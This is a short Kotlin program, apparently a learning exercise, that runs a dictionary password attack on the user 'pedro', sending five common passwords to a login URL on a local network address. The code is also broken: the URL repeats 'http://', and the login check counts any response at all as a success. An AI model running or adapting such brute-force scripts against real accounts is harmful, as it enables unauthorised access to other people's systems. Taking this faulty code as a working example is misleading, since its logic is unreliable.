import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.URI

fun main() {
    val username = "pedro"


    var passwords = listOf("12345", "password", "123456", "qwerty", "admin")

    for (password in passwords) {
        val success = tryLogin(username, password)
        if (success) {
            println("Password encontrado: $password")
            return
        } else {
            println("Password no encontrado: $password")
        }
    }
    println("No encontrado")
}

fun tryLogin(username: String, password: String): Boolean {
    return try {
        val url = URI("http://http://192.168.2.167/dashboard/username=$username&password=$password").toURL()
        val connection = url.openConnection()
        val input = connection.getInputStream()
        val buffer = BufferedReader(InputStreamReader(input))

        var response = ""
        var line: String?
        while (buffer.readLine().also { line = it } != null) {
            response += line
        }

        buffer.close()
        input.close()


        return true

    } catch (e: Exception) {
        false
    }
}